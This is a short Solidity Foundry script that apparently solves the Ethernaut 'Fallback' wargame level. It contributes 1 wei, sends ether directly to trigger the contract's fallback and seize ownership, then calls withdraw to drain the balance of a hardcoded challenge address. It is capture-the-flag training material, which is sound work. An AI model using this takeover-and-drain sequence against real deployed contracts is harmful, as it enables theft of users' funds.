// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";
import {console} from "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance =
        Fallback(payable(0x056afa08FB8b6c713290532Efd0AF20B54265bED));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackInstance.contribute{value: 1 wei}();
        console.log("Contributed 1 wei to the Fallback contract.");
        (bool sent, ) = address(fallbackInstance).call{value: 1 wei}("");
        if (!sent) {
            console.log("failed sending eth to contract");
        } else {
            console.log("passed sending eth");
        }
        fallbackInstance.withdraw();
        vm.stopBroadcast();
    }
}
